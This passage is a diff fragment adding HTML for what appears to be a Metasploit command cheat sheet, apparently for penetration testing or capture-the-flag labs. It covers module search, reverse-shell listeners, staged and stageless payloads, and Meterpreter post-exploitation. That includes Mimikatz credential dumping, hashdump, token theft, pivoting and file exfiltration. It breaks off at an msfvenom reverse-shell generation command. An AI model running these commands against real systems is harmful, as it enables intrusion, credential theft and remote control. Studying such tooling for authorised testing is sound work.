+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">resource</span> <span class="tok-val">/tmp/eng.rc</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Execute automated commands from resource script</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">spool</span> <span class="tok-val">/tmp/eng.log</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Log all console output to engagement evidence file</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">spool</span> <span class="tok-val">off</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Disable active console logging</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2. Search & Modules -->
+    <section class="content-section" id="search" aria-labelledby="search-title">
+      <h2 class="content-section__title" id="search-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+        Search &amp; Module Selection
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Advanced Search -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Advanced module search filtering</div>
+              <div class="cmd-block__desc">Filter across 2,400+ modules by type, platform, CVE year, and exploit reliability rank.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">search</span> <span class="tok-flag">type:exploit</span> <span class="tok-flag">platform:windows</span> <span class="tok-flag">cve:2021</span> <span class="tok-flag">rank:excellent</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">search</span> <span class="tok-flag">cve:2021-44228</span> <span class="tok-flag">type:exploit</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Search Log4Shell CVE</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">search</span> <span class="tok-flag">path:scada</span> <span class="tok-flag">type:auxiliary</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Filter modules by tree path</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Module Config -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Module selection, inspection, and options validation</div>
+              <div class="cmd-block__desc">Activate modules by index number, inspect requirements, and isolate unconfigured variables.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">use</span> <span class="tok-val">0</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Select first module from search results index</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">info</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Read disclosure description, authors, and side-effects</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">show</span> <span class="tok-val">options</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Display all required and optional module variables</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">show</span> <span class="tok-val">missing</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Show only the required fields that still need values</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Global Variables -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Global variables (setg / unsetg)</div>
+              <div class="cmd-block__desc">Persist attacking interface IP and default target across all modules in your console session.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">setg</span> <span class="tok-val">LHOST</span> <span class="tok-arg">10.10.14.5</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Set attacking IP once for entire session</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">setg</span> <span class="tok-val">RHOSTS</span> <span class="tok-arg">10.10.10.1</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Set global target IP</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">unsetg</span> <span class="tok-val">RHOSTS</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Unset global variable</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 4: Auxiliary Scanners -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Auxiliary Modules — Scanners &amp; service enumeration</div>
+              <div class="cmd-block__desc">Auxiliary modules are scanners and fuzzers — no payload, no session, just information.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">use</span> <span class="tok-val">auxiliary/scanner/smb/smb_version</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Load SMB service version scanner</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">RHOSTS</span> <span class="tok-arg">10.10.10.0/24</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Scan entire target subnet</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">THREADS</span> <span class="tok-arg">16</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Accelerate scan concurrency</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">run</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Execute scan &amp; populate services database</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3. Payloads & Listeners -->
+    <section class="content-section" id="payloads" aria-labelledby="payloads-title">
+      <h2 class="content-section__title" id="payloads-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.18 2h3a2 2 0 0 1 2 1.72"/></svg>
+        Payloads &amp; Listeners
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: multi/handler -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">multi/handler with persistent listener (ExitOnSession false)</div>
+              <div class="cmd-block__desc">Catch inbound reverse payloads in background jobs without closing after the first shell.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">use</span> <span class="tok-val">exploit/multi/handler</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">payload</span> <span class="tok-arg">windows/x64/meterpreter/reverse_tcp</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">LHOST</span> <span class="tok-arg">10.10.14.5</span> &amp;&amp; <span class="tok-cmd">set</span> <span class="tok-val">LPORT</span> <span class="tok-arg">4444</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">ExitOnSession</span> <span class="tok-val">false</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Crucial: Listener stays open for multiple incoming shells</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">exploit</span> <span class="tok-flag">-j</span> <span class="tok-flag">-z</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Run listener as background job (-j) without auto-interacting (-z)</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Staged vs Stageless Architecture -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Staged vs. Stageless Payloads (The Slash vs. Underscore Rule)</div>
+              <div class="cmd-block__desc">Understand the operational mechanics that govern payload delivery, memory footprint, and listener compatibility.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="flags-table-wrap">
+              <table class="flags-table" role="table">
+                <thead><tr><th scope="col">Type</th><th scope="col">Naming Syntax</th><th scope="col">Execution Mechanism</th><th scope="col">Listener Requirement</th></tr></thead>
+                <tbody>
+                  <tr>
+                    <td><code class="flag-code">Staged</code></td>
+                    <td><code>meterpreter/reverse_tcp</code> (has slash)</td>
+                    <td class="flag-desc">Small ~300 byte stager executes first, opens socket, and pulls large reflective DLL stage into memory</td>
+                    <td class="flag-default"><strong>Requires multi/handler</strong> (Netcat cannot send stage 2)</td>
+                  </tr>
+                  <tr>
+                    <td><code class="flag-code">Stageless</code></td>
+                    <td><code>meterpreter_reverse_tcp</code> (underscore)</td>
+                    <td class="flag-desc">Monolithic binary containing all Meterpreter logic embedded in payload; executes self-contained</td>
+                    <td class="flag-default"><strong>Can be caught with Netcat</strong> (<code>nc -lvnp 4444</code>) or multi/handler</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Non-Meterpreter Payloads -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Non-Meterpreter payloads (cmd &amp; /bin/sh)</div>
+              <div class="cmd-block__desc">Raw command shells without reflective DLL injection; lighter memory footprint and lower EDR detection rate.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">payload</span> <span class="tok-arg">windows/x64/shell/reverse_tcp</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Direct Windows cmd.exe reverse shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">payload</span> <span class="tok-arg">linux/x64/shell_reverse_tcp</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Direct Linux POSIX /bin/sh stageless shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4. Meterpreter & Post-Exploitation -->
+    <section class="content-section" id="meterpreter" aria-labelledby="meterpreter-title">
+      <h2 class="content-section__title" id="meterpreter-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+        Meterpreter &amp; Post-Exploitation
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Command</th><th scope="col">Operational Action</th><th scope="col">Tactic</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">sysinfo</code></td><td class="flag-desc">Display OS architecture, build number, and hostname</td><td class="flag-default">Discovery</td></tr>
+            <tr><td><code class="flag-code">getuid</code></td><td class="flag-desc">Check current process security context / user token</td><td class="flag-default">Discovery</td></tr>
+            <tr><td><code class="flag-code">getsystem</code></td><td class="flag-desc">Automate SYSTEM privilege escalation (named pipes / token dupe)</td><td class="flag-default">Privilege Escalation</td></tr>
+            <tr><td><code class="flag-code">steal_token &lt;PID&gt;</code></td><td class="flag-desc">Impersonate security token of an elevated process</td><td class="flag-default">Privilege Escalation</td></tr>
+            <tr><td><code class="flag-code">load kiwi; creds_all</code></td><td class="flag-desc">Inject Mimikatz in memory; extract plaintext passwords &amp; NTLM hashes</td><td class="flag-default">Credential Access</td></tr>
+            <tr><td><code class="flag-code">hashdump</code></td><td class="flag-desc">Dump local SAM database hashes (requires elevated token)</td><td class="flag-default">Credential Access</td></tr>
+            <tr><td><code class="flag-code">ps</code> &rarr; <code>migrate &lt;PID&gt;</code></td><td class="flag-desc">Inject Meterpreter thread into a stable system process (e.g. explorer.exe)</td><td class="flag-default">Defense Evasion</td></tr>
+            <tr><td><code class="flag-code">portfwd add -l 3389 -p 3389 -r 172.16.1.10</code></td><td class="flag-desc">Pivot: forward local port 3389 through Meterpreter to an internal subnet host</td><td class="flag-default">Lateral Movement</td></tr>
+            <tr><td><code class="flag-code">download &lt;remote&gt; &lt;local&gt;</code></td><td class="flag-desc">Exfiltrate sensitive file from compromised system</td><td class="flag-default">Collection</td></tr>
+            <tr><td><code class="flag-code">upload &lt;local&gt; &lt;remote&gt;</code></td><td class="flag-desc">Push binary or script to remote target</td><td class="flag-default">Execution</td></tr>
+            <tr><td><code class="flag-code">shell</code></td><td class="flag-desc">Spawn interactive native OS shell (cmd.exe or /bin/bash)</td><td class="flag-default">Execution</td></tr>
+            <tr><td><code class="flag-code">background</code> (or Ctrl+Z)</td><td class="flag-desc">Background active session and return to msfconsole prompt</td><td class="flag-default">Session Mgmt</td></tr>
+            <tr><td><code class="flag-code">sessions -l</code> / <code>sessions -i &lt;ID&gt;</code></td><td class="flag-desc">List active compromised sessions / interact with session ID</td><td class="flag-default">Session Mgmt</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="cmd-list" role="list" style="margin-top:var(--sp-4);">
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Automated Post-Exploitation Modules</div>
+              <div class="cmd-block__desc">Run reconnaissance, privilege escalation suggestions, and upgrade raw shells.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">use</span> <span class="tok-val">post/multi/recon/local_exploit_suggester</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">SESSION</span> <span class="tok-val">1</span> &amp;&amp; <span class="tok-cmd">run</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Analyze architecture and recommend local privilege escalation exploits</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">use</span> <span class="tok-val">post/multi/manage/shell_to_meterpreter</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">set</span> <span class="tok-val">SESSION</span> <span class="tok-val">1</span> &amp;&amp; <span class="tok-cmd">run</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Upgrade a raw shell session into full Meterpreter</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5. msfvenom & Evasion -->
+    <section class="content-section" id="msfvenom" aria-labelledby="msfvenom-title">
+      <h2 class="content-section__title" id="msfvenom-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        msfvenom &amp; Modern Evasion
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Standard Payloads -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Standard Cross-Platform Payloads (Stageless &amp; Encrypted)</div>
+              <div class="cmd-block__desc">Generate self-contained reverse HTTPS executables, Linux binaries, and PHP web shells.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">msfvenom</span> <span class="tok-flag">-p</span> <span class="tok-val">windows/x64/meterpreter_reverse_https</span> <span class="tok-flag">LHOST=</span><span class="tok-arg">10.10.14.5</span> <span class="tok-flag">LPORT=</span><span class="tok-arg">443</span> <span class="tok-flag">-f</span> <span class="tok-val">exe</span> <span class="tok-flag">-o</span> <span class="tok-arg">shell.exe</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
